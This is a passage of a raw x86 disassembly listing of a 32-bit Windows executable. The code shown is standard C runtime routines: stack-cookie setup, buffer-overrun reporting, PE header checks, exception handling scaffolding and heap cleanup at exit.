  40d6b7:	mov    ecx,DWORD PTR ds:0x40e01c
  40d6bd:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  40d6c1:	push   0x4010b8
  40d6c6:	call   0x40d597
  40d6cb:	leave  
  40d6cc:	ret    
  40d6cd:	push   ebp
  40d6ce:	mov    ebp,esp
  40d6d0:	push   0x8
  40d6d2:	call   0x40d6d9
  40d6d7:	pop    ebp
  40d6d8:	ret    
  40d6d9:	push   ebp
  40d6da:	mov    ebp,esp
  40d6dc:	sub    esp,0x31c
  40d6e2:	push   0x17
  40d6e4:	call   0x40db2e
  40d6e9:	test   eax,eax
  40d6eb:	je     0x40d6f2
  40d6ed:	mov    ecx,DWORD PTR [ebp+0x8]
  40d6f0:	int    0x29
  40d6f2:	mov    ds:0x40e1e0,eax
  40d6f7:	mov    DWORD PTR ds:0x40e1dc,ecx
  40d6fd:	mov    DWORD PTR ds:0x40e1d8,edx
  40d703:	mov    DWORD PTR ds:0x40e1d4,ebx
  40d709:	mov    DWORD PTR ds:0x40e1d0,esi
  40d70f:	mov    DWORD PTR ds:0x40e1cc,edi
  40d715:	data16 mov WORD PTR ds:0x40e1f8,ss
  40d71c:	data16 mov WORD PTR ds:0x40e1ec,cs
  40d723:	data16 mov WORD PTR ds:0x40e1c8,ds
  40d72a:	data16 mov WORD PTR ds:0x40e1c4,es
  40d731:	data16 mov WORD PTR ds:0x40e1c0,fs
  40d738:	data16 mov WORD PTR ds:0x40e1bc,gs
  40d73f:	pushf  
  40d740:	pop    DWORD PTR ds:0x40e1f0
  40d746:	mov    eax,DWORD PTR [ebp+0x0]
  40d749:	mov    ds:0x40e1e4,eax
  40d74e:	mov    eax,DWORD PTR [ebp+0x4]
  40d751:	mov    ds:0x40e1e8,eax
  40d756:	lea    eax,[ebp+0x8]
  40d759:	mov    ds:0x40e1f4,eax
  40d75e:	mov    eax,DWORD PTR [ebp-0x31c]
  40d764:	mov    eax,ds:0x40e1e8
  40d769:	mov    ds:0x40e0ec,eax
  40d76e:	mov    DWORD PTR ds:0x40e0e0,0xc0000409
  40d778:	mov    DWORD PTR ds:0x40e0e4,0x1
  40d782:	mov    DWORD PTR ds:0x40e0f0,0x1
  40d78c:	push   0x4
  40d78e:	pop    eax
  40d78f:	imul   eax,eax,0x0
  40d792:	mov    ecx,DWORD PTR [ebp+0x8]
  40d795:	mov    DWORD PTR [eax+0x40e0f4],ecx
  40d79b:	push   0x4010b8
  40d7a0:	call   0x40d597
  40d7a5:	leave  
  40d7a6:	ret    
  40d7a7:	push   ebp
  40d7a8:	mov    ebp,esp
  40d7aa:	mov    eax,DWORD PTR [ebp+0x8]
  40d7ad:	mov    eax,DWORD PTR [eax]
  40d7af:	cmp    DWORD PTR [eax],0xe06d7363
  40d7b5:	jne    0x40d7dc
  40d7b7:	cmp    DWORD PTR [eax+0x10],0x3
  40d7bb:	jne    0x40d7dc
  40d7bd:	mov    eax,DWORD PTR [eax+0x14]
  40d7c0:	cmp    eax,0x19930520
  40d7c5:	je     0x40d7e2
  40d7c7:	cmp    eax,0x19930521
  40d7cc:	je     0x40d7e2
  40d7ce:	cmp    eax,0x19930522
  40d7d3:	je     0x40d7e2
  40d7d5:	cmp    eax,0x1994000
  40d7da:	je     0x40d7e2
  40d7dc:	xor    eax,eax
  40d7de:	pop    ebp
  40d7df:	ret    0x4
  40d7e2:	call   0x40db10
  40d7e7:	int3   
  40d7e8:	push   0x40d7a7
  40d7ed:	call   0x40db16
  40d7f2:	pop    ecx
  40d7f3:	xor    eax,eax
  40d7f5:	ret    
  40d7f6:	jmp    DWORD PTR ds:0x424444
  40d7fc:	jmp    DWORD PTR ds:0x424448
  40d802:	int3   
  40d803:	int3   
  40d804:	int3   
  40d805:	int3   
  40d806:	int3   
  40d807:	int3   
  40d808:	int3   
  40d809:	int3   
  40d80a:	int3   
  40d80b:	int3   
  40d80c:	int3   
  40d80d:	int3   
  40d80e:	int3   
  40d80f:	int3   
  40d810:	push   ebp
  40d811:	mov    ebp,esp
  40d813:	mov    eax,DWORD PTR [ebp+0x8]
  40d816:	push   ebx
  40d817:	mov    ecx,DWORD PTR [eax+0x3c]
  40d81a:	add    ecx,eax
  40d81c:	push   esi
  40d81d:	movzx  eax,WORD PTR [ecx+0x14]
  40d821:	movzx  ebx,WORD PTR [ecx+0x6]
  40d825:	add    eax,0x18
  40d828:	xor    edx,edx
  40d82a:	add    eax,ecx
  40d82c:	push   edi
  40d82d:	test   ebx,ebx
  40d82f:	je     0x40d84c
  40d831:	mov    edi,DWORD PTR [ebp+0xc]
  40d834:	mov    esi,DWORD PTR [eax+0xc]
  40d837:	cmp    edi,esi
  40d839:	jb     0x40d844
  40d83b:	mov    ecx,DWORD PTR [eax+0x8]
  40d83e:	add    ecx,esi
  40d840:	cmp    edi,ecx
  40d842:	jb     0x40d84e
  40d844:	inc    edx
  40d845:	add    eax,0x28
  40d848:	cmp    edx,ebx
  40d84a:	jb     0x40d834
  40d84c:	xor    eax,eax
  40d84e:	pop    edi
  40d84f:	pop    esi
  40d850:	pop    ebx
  40d851:	pop    ebp
  40d852:	ret    
  40d853:	int3   
  40d854:	int3   
  40d855:	int3   
  40d856:	int3   
  40d857:	int3   
  40d858:	int3   
  40d859:	int3   
  40d85a:	int3   
  40d85b:	int3   
  40d85c:	int3   
  40d85d:	int3   
  40d85e:	int3   
  40d85f:	int3   
  40d860:	push   ebp
  40d861:	mov    ebp,esp
  40d863:	push   0xfffffffe
  40d865:	push   0x40df78
  40d86a:	push   0x40dac9
  40d86f:	mov    eax,fs:0x0
  40d875:	push   eax
  40d876:	sub    esp,0x8
  40d879:	push   ebx
  40d87a:	push   esi
  40d87b:	push   edi
  40d87c:	mov    eax,ds:0x40e018
  40d881:	xor    DWORD PTR [ebp-0x8],eax
  40d884:	xor    eax,ebp
  40d886:	push   eax
  40d887:	lea    eax,[ebp-0x10]
  40d88a:	mov    fs:0x0,eax
  40d890:	mov    DWORD PTR [ebp-0x18],esp
  40d893:	mov    DWORD PTR [ebp-0x4],0x0
  40d89a:	push   0x400000
  40d89f:	call   0x40d920
  40d8a4:	add    esp,0x4
  40d8a7:	test   eax,eax
  40d8a9:	je     0x40d8ff
  40d8ab:	mov    eax,DWORD PTR [ebp+0x8]
  40d8ae:	sub    eax,0x400000
  40d8b3:	push   eax
  40d8b4:	push   0x400000
  40d8b9:	call   0x40d810
  40d8be:	add    esp,0x8
  40d8c1:	test   eax,eax
  40d8c3:	je     0x40d8ff
  40d8c5:	mov    eax,DWORD PTR [eax+0x24]
  40d8c8:	shr    eax,0x1f
  40d8cb:	not    eax
  40d8cd:	and    eax,0x1
  40d8d0:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40d8d7:	mov    ecx,DWORD PTR [ebp-0x10]
  40d8da:	mov    DWORD PTR fs:0x0,ecx
  40d8e1:	pop    ecx
  40d8e2:	pop    edi
  40d8e3:	pop    esi
  40d8e4:	pop    ebx
  40d8e5:	mov    esp,ebp
  40d8e7:	pop    ebp
  40d8e8:	ret    
  40d8e9:	mov    eax,DWORD PTR [ebp-0x14]
  40d8ec:	mov    eax,DWORD PTR [eax]
  40d8ee:	xor    ecx,ecx
  40d8f0:	cmp    DWORD PTR [eax],0xc0000005
  40d8f6:	sete   cl
  40d8f9:	mov    eax,ecx
  40d8fb:	ret    
  40d8fc:	mov    esp,DWORD PTR [ebp-0x18]
  40d8ff:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40d906:	xor    eax,eax
  40d908:	mov    ecx,DWORD PTR [ebp-0x10]
  40d90b:	mov    DWORD PTR fs:0x0,ecx
  40d912:	pop    ecx
  40d913:	pop    edi
  40d914:	pop    esi
  40d915:	pop    ebx
  40d916:	mov    esp,ebp
  40d918:	pop    ebp
  40d919:	ret    
  40d91a:	int3   
  40d91b:	int3   
  40d91c:	int3   
  40d91d:	int3   
  40d91e:	int3   
  40d91f:	int3   
  40d920:	push   ebp
  40d921:	mov    ebp,esp
  40d923:	mov    eax,DWORD PTR [ebp+0x8]
  40d926:	mov    ecx,0x5a4d
  40d92b:	cmp    WORD PTR [eax],cx
  40d92e:	je     0x40d934
  40d930:	xor    eax,eax
  40d932:	pop    ebp
  40d933:	ret    
  40d934:	mov    ecx,DWORD PTR [eax+0x3c]
  40d937:	add    ecx,eax
  40d939:	xor    eax,eax
  40d93b:	cmp    DWORD PTR [ecx],0x4550
  40d941:	jne    0x40d94f
  40d943:	mov    edx,0x10b
  40d948:	cmp    WORD PTR [ecx+0x18],dx
  40d94c:	sete   al
  40d94f:	pop    ebp
  40d950:	ret    
  40d951:	push   ebp
  40d952:	mov    ebp,esp
  40d954:	sub    esp,0x14
  40d957:	mov    eax,ds:0x40e018
  40d95c:	and    DWORD PTR [ebp-0xc],0x0
  40d960:	and    DWORD PTR [ebp-0x8],0x0
  40d964:	push   esi
  40d965:	push   edi
  40d966:	mov    edi,0xbb40e64e
  40d96b:	mov    esi,0xffff0000
  40d970:	cmp    eax,edi
  40d972:	je     0x40d981
  40d974:	test   esi,eax
  40d976:	je     0x40d981
  40d978:	not    eax
  40d97a:	mov    ds:0x40e01c,eax
  40d97f:	jmp    0x40d9e7
  40d981:	lea    eax,[ebp-0xc]
  40d984:	push   eax
  40d985:	call   DWORD PTR ds:0x42437c
  40d98b:	mov    eax,DWORD PTR [ebp-0x8]
  40d98e:	xor    eax,DWORD PTR [ebp-0xc]
  40d991:	mov    DWORD PTR [ebp-0x4],eax
  40d994:	call   DWORD PTR ds:0x4242f0
  40d99a:	xor    DWORD PTR [ebp-0x4],eax
  40d99d:	call   DWORD PTR ds:0x424380
  40d9a3:	xor    DWORD PTR [ebp-0x4],eax
  40d9a6:	lea    eax,[ebp-0x14]
  40d9a9:	push   eax
  40d9aa:	call   DWORD PTR ds:0x424384
  40d9b0:	mov    ecx,DWORD PTR [ebp-0x10]
  40d9b3:	xor    ecx,DWORD PTR [ebp-0x14]
  40d9b6:	lea    eax,[ebp-0x4]
  40d9b9:	xor    ecx,DWORD PTR [ebp-0x4]
  40d9bc:	xor    ecx,eax
  40d9be:	cmp    ecx,edi
  40d9c0:	jne    0x40d9c9
  40d9c2:	mov    ecx,0xbb40e64f
  40d9c7:	jmp    0x40d9d9
  40d9c9:	test   esi,ecx
  40d9cb:	jne    0x40d9d9
  40d9cd:	mov    eax,ecx
  40d9cf:	or     eax,0x4711
  40d9d4:	shl    eax,0x10
  40d9d7:	or     ecx,eax
  40d9d9:	mov    DWORD PTR ds:0x40e018,ecx
  40d9df:	not    ecx
  40d9e1:	mov    DWORD PTR ds:0x40e01c,ecx
  40d9e7:	pop    edi
  40d9e8:	pop    esi
  40d9e9:	leave  
  40d9ea:	ret    
  40d9eb:	xor    eax,eax
  40d9ed:	ret    
  40d9ee:	push   esi
  40d9ef:	push   edi
  40d9f0:	mov    esi,0x401c98
  40d9f5:	mov    edi,0x401c98
  40d9fa:	jmp    0x40da07
  40d9fc:	mov    eax,DWORD PTR [esi]
  40d9fe:	test   eax,eax
  40da00:	je     0x40da04
  40da02:	call   eax
  40da04:	add    esi,0x4
  40da07:	cmp    esi,edi
  40da09:	jb     0x40d9fc
  40da0b:	pop    edi
  40da0c:	pop    esi
  40da0d:	ret    
  40da0e:	push   esi
  40da0f:	push   edi
  40da10:	mov    esi,0x401ca0
  40da15:	mov    edi,0x401ca0
  40da1a:	jmp    0x40da27
  40da1c:	mov    eax,DWORD PTR [esi]
  40da1e:	test   eax,eax
  40da20:	je     0x40da24
  40da22:	call   eax
  40da24:	add    esi,0x4
  40da27:	cmp    esi,edi
  40da29:	jb     0x40da1c
  40da2b:	pop    edi
  40da2c:	pop    esi
  40da2d:	ret    
  40da2e:	push   esi
  40da2f:	push   0x30000
  40da34:	push   0x10000
  40da39:	xor    esi,esi
  40da3b:	push   esi
  40da3c:	call   0x40db22
  40da41:	add    esp,0xc
  40da44:	test   eax,eax
  40da46:	jne    0x40da4a
  40da48:	pop    esi
  40da49:	ret    
  40da4a:	push   esi
  40da4b:	push   esi
  40da4c:	push   esi
  40da4d:	push   esi
  40da4e:	push   esi
  40da4f:	call   0x40db1c
  40da54:	int3   
  40da55:	int3   
  40da56:	jmp    DWORD PTR ds:0x424464
  40da5c:	jmp    DWORD PTR ds:0x424468
  40da62:	int3   
  40da63:	int3   
  40da64:	int3   
  40da65:	int3   
  40da66:	int3   
  40da67:	int3   
  40da68:	int3   
  40da69:	int3   
  40da6a:	int3   
  40da6b:	int3   
  40da6c:	int3   
  40da6d:	int3   
  40da6e:	int3   
  40da6f:	int3   
  40da70:	push   0x40dac9
  40da75:	push   DWORD PTR fs:0x0
  40da7c:	mov    eax,DWORD PTR [esp+0x10]
  40da80:	mov    DWORD PTR [esp+0x10],ebp
  40da84:	lea    ebp,[esp+0x10]
  40da88:	sub    esp,eax
  40da8a:	push   ebx
  40da8b:	push   esi
  40da8c:	push   edi
  40da8d:	mov    eax,ds:0x40e018
  40da92:	xor    DWORD PTR [ebp-0x4],eax
  40da95:	xor    eax,ebp
  40da97:	push   eax
  40da98:	mov    DWORD PTR [ebp-0x18],esp
  40da9b:	push   DWORD PTR [ebp-0x8]
  40da9e:	mov    eax,DWORD PTR [ebp-0x4]
  40daa1:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40daa8:	mov    DWORD PTR [ebp-0x8],eax
  40daab:	lea    eax,[ebp-0x10]
  40daae:	mov    fs:0x0,eax
  40dab4:	ret    
  40dab5:	mov    ecx,DWORD PTR [ebp-0x10]
  40dab8:	mov    DWORD PTR fs:0x0,ecx
  40dabf:	pop    ecx
  40dac0:	pop    edi
  40dac1:	pop    edi
  40dac2:	pop    esi
  40dac3:	pop    ebx
  40dac4:	mov    esp,ebp
  40dac6:	pop    ebp
  40dac7:	push   ecx
  40dac8:	ret    
  40dac9:	push   ebp
  40daca:	mov    ebp,esp
  40dacc:	push   DWORD PTR [ebp+0x14]
  40dacf:	push   DWORD PTR [ebp+0x10]
  40dad2:	push   DWORD PTR [ebp+0xc]
  40dad5:	push   DWORD PTR [ebp+0x8]
  40dad8:	push   0x40d492
  40dadd:	push   0x40e018
  40dae2:	call   0x40db28
  40dae7:	add    esp,0x18
  40daea:	pop    ebp
  40daeb:	ret    
  40daec:	jmp    DWORD PTR ds:0x424478
  40daf2:	jmp    DWORD PTR ds:0x42447c
  40daf8:	jmp    DWORD PTR ds:0x424484
  40dafe:	jmp    DWORD PTR ds:0x42448c
  40db04:	jmp    DWORD PTR ds:0x424490
  40db0a:	jmp    DWORD PTR ds:0x424494
  40db10:	jmp    DWORD PTR ds:0x424498
  40db16:	jmp    DWORD PTR ds:0x42449c
  40db1c:	jmp    DWORD PTR ds:0x4244a0
  40db22:	jmp    DWORD PTR ds:0x4244a4
  40db28:	jmp    DWORD PTR ds:0x4244a8
  40db2e:	jmp    DWORD PTR ds:0x42436c
  40db34:	int3   
  40db35:	int3   
  40db36:	int3   
  40db37:	int3   
  40db38:	int3   
  40db39:	int3   
  40db3a:	int3   
  40db3b:	int3   
  40db3c:	int3   
  40db3d:	int3   
  40db3e:	int3   
  40db3f:	int3   
  40db40:	push   ecx
  40db41:	lea    ecx,[esp+0x4]
  40db45:	sub    ecx,eax
  40db47:	sbb    eax,eax
  40db49:	not    eax
  40db4b:	and    ecx,eax
  40db4d:	mov    eax,esp
  40db4f:	and    eax,0xfffff000
  40db54:	cmp    ecx,eax
  40db56:	jb     0x40db62
  40db58:	mov    eax,ecx
  40db5a:	pop    ecx
  40db5b:	xchg   esp,eax
  40db5c:	mov    eax,DWORD PTR [eax]
  40db5e:	mov    DWORD PTR [esp],eax
  40db61:	ret    
  40db62:	sub    eax,0x1000
  40db67:	test   DWORD PTR [eax],eax
  40db69:	jmp    0x40db54
  40db6b:	int3   
  40db6c:	jmp    DWORD PTR ds:0x4244ac
  40db72:	jmp    DWORD PTR ds:0x4244c8
  40db78:	int3   
  40db79:	int3   
  40db7a:	int3   
  40db7b:	int3   
  40db7c:	int3   
  40db7d:	int3   
  40db7e:	int3   
  40db7f:	int3   
  40db80:	push   0x0
  40db82:	push   0x0
  40db84:	push   0x0
  40db86:	call   DWORD PTR ds:0x4242b4
  40db8c:	push   0x40dc50
  40db91:	mov    ds:0x40e648,eax
  40db96:	call   0x40d582
  40db9b:	pop    ecx
  40db9c:	ret    
  40db9d:	int3   
  40db9e:	int3   
  40db9f:	int3   
  40dba0:	push   ebp
  40dba1:	mov    ebp,esp
  40dba3:	sub    esp,0x24
  40dba6:	lea    eax,[ebp-0x24]
  40dba9:	push   eax
  40dbaa:	call   DWORD PTR ds:0x4242bc
  40dbb0:	mov    eax,DWORD PTR [ebp-0x20]
  40dbb3:	mov    ds:0x40eaf4,eax
  40dbb8:	mov    esp,ebp
  40dbba:	pop    ebp
  40dbbb:	ret    
  40dbbc:	int3   
  40dbbd:	int3   
  40dbbe:	int3   
  40dbbf:	int3   
  40dbc0:	push   0x40dc60
  40dbc5:	call   0x40d582
  40dbca:	pop    ecx
  40dbcb:	ret    
  40dbcc:	int3   
  40dbcd:	int3   
  40dbce:	int3   
  40dbcf:	int3   
  40dbd0:	mov    ecx,0x10000
  40dbd5:	call   0x40ce30
  40dbda:	push   0x40dca0
  40dbdf:	mov    ds:0x40e054,eax
  40dbe4:	call   0x40d582
  40dbe9:	pop    ecx
  40dbea:	ret    
  40dbeb:	int3   
  40dbec:	int3   
  40dbed:	int3   
  40dbee:	int3   
  40dbef:	int3   
  40dbf0:	push   0x40ddc0
  40dbf5:	call   0x40d582
  40dbfa:	pop    ecx
  40dbfb:	ret    
  40dbfc:	int3   
  40dbfd:	int3   
  40dbfe:	int3   
  40dbff:	int3   
  40dc00:	push   0x40de00
  40dc05:	call   0x40d582
  40dc0a:	pop    ecx
  40dc0b:	ret    
  40dc0c:	int3   
  40dc0d:	int3   
  40dc0e:	int3   
  40dc0f:	int3   
  40dc10:	mov    ecx,0x200
  40dc15:	call   0x40cc20
  40dc1a:	push   0x40de40
  40dc1f:	mov    ds:0x40e094,eax
  40dc24:	call   0x40d582
  40dc29:	pop    ecx
  40dc2a:	ret    
  40dc2b:	int3   
  40dc2c:	int3   
  40dc2d:	int3   
  40dc2e:	int3   
  40dc2f:	int3   
  40dc30:	mov    ecx,0x200
  40dc35:	call   0x40ce30
  40dc3a:	push   0x40dee0
  40dc3f:	mov    ds:0x40e0a4,eax
  40dc44:	call   0x40d582
  40dc49:	pop    ecx
  40dc4a:	ret    
  40dc4b:	int3   
  40dc4c:	int3   
  40dc4d:	int3   
  40dc4e:	int3   
  40dc4f:	int3   
  40dc50:	push   DWORD PTR ds:0x40e648
  40dc56:	call   DWORD PTR ds:0x4242b8
  40dc5c:	ret    
  40dc5d:	int3   
  40dc5e:	int3   
  40dc5f:	int3   
  40dc60:	mov    eax,ds:0x40e03c
  40dc65:	test   eax,eax
  40dc67:	je     0x40dc96
  40dc69:	push   eax
  40dc6a:	push   0x0
  40dc6c:	push   DWORD PTR ds:0x40e648
  40dc72:	call   DWORD PTR ds:0x4242c0
  40dc78:	mov    DWORD PTR ds:0x40e040,0x0
  40dc82:	mov    DWORD PTR ds:0x40e03c,0x0
  40dc8c:	mov    DWORD PTR ds:0x40e044,0x0
  40dc96:	ret    
  40dc97:	int3   
  40dc98:	int3   
  40dc99:	int3   
  40dc9a:	int3   
  40dc9b:	int3   
  40dc9c:	int3   
  40dc9d:	int3   
  40dc9e:	int3   
  40dc9f:	int3   
  40dca0:	call   0x406770
  40dca5:	mov    ecx,DWORD PTR ds:0x40e054
  40dcab:	test   ecx,ecx
  40dcad:	je     0x40dced
  40dcaf:	mov    eax,ds:0x40e05c
  40dcb4:	lea    edx,[eax*4+0x0]
  40dcbb:	cmp    edx,0x200
  40dcc1:	jl     0x40dcd3
  40dcc3:	call   0x40c970
  40dcc8:	mov    DWORD PTR ds:0x40e054,0x0
  40dcd2:	ret    
  40dcd3:	cmp    edx,0x4
  40dcd6:	jae    0x40dcdd
  40dcd8:	mov    edx,0x4
  40dcdd:	mov    eax,DWORD PTR [edx*4+0x421b78]
  40dce4:	mov    DWORD PTR [ecx],eax
  40dce6:	mov    DWORD PTR [edx*4+0x421b78],ecx
  40dced:	mov    DWORD PTR ds:0x40e054,0x0
  40dcf7:	ret    
  40dcf8:	int3   
  40dcf9:	int3   
  40dcfa:	int3   
  40dcfb:	int3   
  40dcfc:	int3   
  40dcfd:	int3   
  40dcfe:	int3   
  40dcff:	int3   
  40dd00:	mov    eax,ds:0x423240
  40dd05:	test   eax,eax
  40dd07:	je     0x40dd36
  40dd09:	push   eax
  40dd0a:	push   0x0
  40dd0c:	push   DWORD PTR ds:0x40e648
  40dd12:	call   DWORD PTR ds:0x4242c0
  40dd18:	mov    DWORD PTR ds:0x423244,0x0
  40dd22:	mov    DWORD PTR ds:0x423240,0x0
  40dd2c:	mov    DWORD PTR ds:0x423248,0x0
  40dd36:	ret    
  40dd37:	int3   
  40dd38:	int3   
  40dd39:	int3   
  40dd3a:	int3   
  40dd3b:	int3   
  40dd3c:	int3   
  40dd3d:	int3   
  40dd3e:	int3   
  40dd3f:	int3   
  40dd40:	mov    eax,ds:0x42325c
  40dd45:	test   eax,eax
  40dd47:	je     0x40dd76
  40dd49:	push   eax
  40dd4a:	push   0x0
  40dd4c:	push   DWORD PTR ds:0x40e648
  40dd52:	call   DWORD PTR ds:0x4242c0
  40dd58:	mov    DWORD PTR ds:0x423260,0x0
  40dd62:	mov    DWORD PTR ds:0x42325c,0x0
  40dd6c:	mov    DWORD PTR ds:0x423264,0x0
  40dd76:	ret    
  40dd77:	int3   
  40dd78:	int3   
  40dd79:	int3   
  40dd7a:	int3   
  40dd7b:	int3   
  40dd7c:	int3   
  40dd7d:	int3   
  40dd7e:	int3   
  40dd7f:	int3   
  40dd80:	mov    eax,ds:0x423278
  40dd85:	test   eax,eax
  40dd87:	je     0x40ddb6
  40dd89:	push   eax
  40dd8a:	push   0x0
  40dd8c:	push   DWORD PTR ds:0x40e648
  40dd92:	call   DWORD PTR ds:0x4242c0
  40dd98:	mov    DWORD PTR ds:0x42327c,0x0
  40dda2:	mov    DWORD PTR ds:0x423278,0x0
  40ddac:	mov    DWORD PTR ds:0x423280,0x0
  40ddb6:	ret    
  40ddb7:	int3   
  40ddb8:	int3   
  40ddb9:	int3   
  40ddba:	int3   
  40ddbb:	int3   
  40ddbc:	int3   
  40ddbd:	int3   
  40ddbe:	int3   
  40ddbf:	int3   
  40ddc0:	mov    eax,ds:0x40e064
  40ddc5:	test   eax,eax
  40ddc7:	je     0x40ddf6
  40ddc9:	push   eax
  40ddca:	push   0x0
  40ddcc:	push   DWORD PTR ds:0x40e648
  40ddd2:	call   DWORD PTR ds:0x4242c0
  40ddd8:	mov    DWORD PTR ds:0x40e068,0x0
  40dde2:	mov    DWORD PTR ds:0x40e064,0x0
  40ddec:	mov    DWORD PTR ds:0x40e06c,0x0
  40ddf6:	ret    
  40ddf7:	int3   
  40ddf8:	int3   
  40ddf9:	int3   
  40ddfa:	int3   
  40ddfb:	int3   
  40ddfc:	int3   
  40ddfd:	int3   
  40ddfe:	int3   
  40ddff:	int3   
  40de00:	mov    eax,ds:0x40e07c
  40de05:	test   eax,eax
  40de07:	je     0x40de36
  40de09:	push   eax
  40de0a:	push   0x0
  40de0c:	push   DWORD PTR ds:0x40e648
  40de12:	call   DWORD PTR ds:0x4242c0
  40de18:	mov    DWORD PTR ds:0x40e080,0x0
  40de22:	mov    DWORD PTR ds:0x40e07c,0x0
  40de2c:	mov    DWORD PTR ds:0x40e084,0x0
  40de36:	ret    
  40de37:	int3   
  40de38:	int3   
  40de39:	int3   
  40de3a:	int3   
  40de3b:	int3   
  40de3c:	int3   
  40de3d:	int3   
  40de3e:	int3   
  40de3f:	int3   
  40de40:	call   0x40c320
  40de45:	mov    ecx,DWORD PTR ds:0x40e094
  40de4b:	test   ecx,ecx
  40de4d:	je     0x40de8d
  40de4f:	mov    eax,ds:0x40e09c
  40de54:	lea    edx,[eax*4+0x0]
  40de5b:	cmp    edx,0x200
  40de61:	jl     0x40de73
  40de63:	call   0x40c970
  40de68:	mov    DWORD PTR ds:0x40e094,0x0
  40de72:	ret    
  40de73:	cmp    edx,0x4
  40de76:	jae    0x40de7d
  40de78:	mov    edx,0x4
  40de7d:	mov    eax,DWORD PTR [edx*4+0x41fb78]
  40de84:	mov    DWORD PTR [ecx],eax
  40de86:	mov    DWORD PTR [edx*4+0x41fb78],ecx
  40de8d:	mov    DWORD PTR ds:0x40e094,0x0
  40de97:	ret    
  40de98:	int3   
  40de99:	int3   
  40de9a:	int3   
  40de9b:	int3   
  40de9c:	int3   
  40de9d:	int3   
  40de9e:	int3   
  40de9f:	int3   
  40dea0:	mov    eax,ds:0x423294
  40dea5:	test   eax,eax
  40dea7:	je     0x40ded6
  40dea9:	push   eax
  40deaa:	push   0x0
  40deac:	push   DWORD PTR ds:0x40e648
  40deb2:	call   DWORD PTR ds:0x4242c0
  40deb8:	mov    DWORD PTR ds:0x423298,0x0
  40dec2:	mov    DWORD PTR ds:0x423294,0x0
  40decc:	mov    DWORD PTR ds:0x42329c,0x0
  40ded6:	ret    
  40ded7:	int3   
  40ded8:	int3   
  40ded9:	int3   
  40deda:	int3   
  40dedb:	int3   
  40dedc:	int3   
  40dedd:	int3   
  40dede:	int3   
  40dedf:	int3   
  40dee0:	call   0x40c470
  40dee5:	mov    ecx,DWORD PTR ds:0x40e0a4
  40deeb:	test   ecx,ecx
  40deed:	je     0x40df2d
  40deef:	mov    eax,ds:0x40e0ac
  40def4:	lea    edx,[eax*4+0x0]
  40defb:	cmp    edx,0x200
  40df01:	jl     0x40df13
  40df03:	call   0x40c970
  40df08:	mov    DWORD PTR ds:0x40e0a4,0x0
  40df12:	ret    
  40df13:	cmp    edx,0x4
  40df16:	jae    0x40df1d
  40df18:	mov    edx,0x4
  40df1d:	mov    eax,DWORD PTR [edx*4+0x421b78]
  40df24:	mov    DWORD PTR [ecx],eax
  40df26:	mov    DWORD PTR [edx*4+0x421b78],ecx
  40df2d:	mov    DWORD PTR ds:0x40e0a4,0x0
  40df37:	ret    
  40df38:	(bad)  
  40df39:	(bad)  
  40df3a:	(bad)  
  40df3b:	inc    DWORD PTR [eax]
  40df3d:	add    BYTE PTR [eax],al
  40df3f:	add    ah,dl
  40df41:	(bad)  
  40df42:	(bad)  
  40df43:	inc    DWORD PTR [eax]
  40df45:	add    BYTE PTR [eax],al
  40df47:	add    dh,bh
  40df49:	(bad)  
  40df4a:	(bad)  
  40df4b:	(bad)  
  40df4c:	cmp    ah,dl
  40df4e:	inc    eax
  40df4f:	add    BYTE PTR [esp+edx*8+0x40],cl
  40df53:	add    BYTE PTR [eax],al
  40df55:	add    BYTE PTR [eax],al
  40df57:	add    dh,bh
  40df59:	(bad)  
  40df5a:	(bad)  
  40df5b:	inc    DWORD PTR [eax]
  40df5d:	add    BYTE PTR [eax],al
  40df5f:	add    ah,cl
  40df61:	(bad)  
  40df62:	(bad)  
  40df63:	inc    DWORD PTR [eax]
  40df65:	add    BYTE PTR [eax],al
  40df67:	add    dh,bh
  40df69:	(bad)  
  40df6a:	(bad)  
  40df6b:	inc    DWORD PTR [eax]
  40df6d:	add    BYTE PTR [eax],al
  40df6f:	add    BYTE PTR [esi-0x2b],dh
  40df72:	inc    eax
  40df73:	add    BYTE PTR [eax],al
  40df75:	add    BYTE PTR [eax],al
  40df77:	add    dh,bh
  40df79:	(bad)  
  40df7a:	(bad)  
  40df7b:	inc    DWORD PTR [eax]
  40df7d:	add    BYTE PTR [eax],al
  40df7f:	add    al,bl
  40df81:	(bad)  
  40df82:	(bad)  
  40df83:	inc    DWORD PTR [eax]
  40df85:	add    BYTE PTR [eax],al
  40df87:	add    dh,bh
  40df89:	(bad)  
  40df8a:	(bad)  
  40df8b:	(bad)  
  40df8c:	jmp    0xfc412069
  40df91:	fadd   DWORD PTR [eax+0x0]
  40df94:	add    BYTE PTR [eax],al
  40df96:	add    BYTE PTR [eax],al
  40df98:	in     al,0xff
  40df9a:	(bad)  
  40df9b:	inc    DWORD PTR [eax]
  40df9d:	add    BYTE PTR [eax],al
  40df9f:	add    BYTE PTR [eax+0xfffffa],cl
  40dfa5:	add    BYTE PTR [eax],al
  40dfa7:	add    dh,bh
  40dfa9:	(bad)  
  40dfaa:	(bad)  
  40dfab:	(bad)  
  40dfac:	jp     0x40df31
  40dfae:	inc    eax
  40dfaf:	.byte 0x0
  40dfb0:	xchg   ebx,eax
  40dfb1:	.byte 0x83
  40dfb2:	inc    eax
	...
